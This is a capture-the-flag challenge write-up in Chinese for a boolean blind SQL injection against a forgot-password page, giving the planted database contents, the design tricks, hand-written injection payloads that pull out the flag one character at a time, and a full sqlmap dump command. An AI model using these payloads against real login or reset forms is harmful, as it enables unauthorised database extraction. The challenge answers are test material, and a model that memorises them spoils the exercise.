## 题目名称
迷惑行为大赏（之）盲注

## 题目描述
题目里有红包信息，比赛结束时发放

hint: 没有源码，没有备份文件，不需要爆破，不需要扫描器，瞎注吧。

## 出题/解题思路
```bash
# database库
`user`表：
id,username,passw0rd
1,admin,327a6c4304ad5938eaf0efb6cc3e53dc=md5('flag')
2,root,8134b84030cca5285ed0e0b31ba06f10=md5('just')
3,master,a74eaee2c556e919790756dd07b6b555=md5('indb')

# 测试库
`15665611612`表：
id,values,what@you@want
1,272,e
2,314,pai
3,618,perfect
-1,877,flag{xxxxx-xxxx-xxxx-xxxxxxx}
666,666,领红包信息

`user`表
id,username,passw0rd,password+一堆乱七八蕉的字段名，没有数据
```

1. 数据库名/表名/字段名 是 关键词/全数字 时用反引号
2. 查询非默认连接的数据库的表数据，`数据库名.表名`
3. 库名为中文，随机填充中文数据，~~禁用ascii等参数~~，防止跑字母表（中文盲注）
4. ~~删除schema表数据或限制查询权限~~
5. 字段名包含`@`，sqlmap默认配置跑不出数据
6. ~~大小写敏感，flag值随机大小写~~

<br/>

**解题思路**

忘记密码页面布尔盲注，sqlmap可以直接梭出数据库、表、字段信息。禁用了mysql写shell。

注数据时在前端测试。

```sql
admin' and ((select length(`what@you@want`) from `测试`.`15665611612` where id=-1)<53)#

admin' and ((select mid(`what@you@want` from 11 for 1) from `测试`.`15665611612` where id=-1)='f')#

admin' and ((select mid(hex(`what@you@want`) from 1 for 1) from `测试`.`15665611612` where id=666)='e')#
```

sqlmap直接梭数据会这样

```bash
Database: 测试
Table: 15665611612
[5 entries]
+-----+----------+---------------+
| id  | values   | what@you@want |
+-----+----------+---------------+
| -1  | 877      | <blank>       |
| 1   | 272      | <blank>       |
| 2   | 314      | <blank>       |
| 3   | 618      | <blank>       |
| 666 | 666      | <blank>       |
+-----+----------+---------------+
```

也可以脚本直接跑。一道没有任何关键词过滤的入门级布尔盲注题，做不出来就真的有点F5了。

SQLMAP直接梭（字段加反引号）
```
sqlmap -u http://your-domain:8080/forgot.php --data "username=admin" --batch --dump --dbms mysql -D 测试 -T 15665611612 -C `what@you@want`
```

## flag

```
动态flag
```
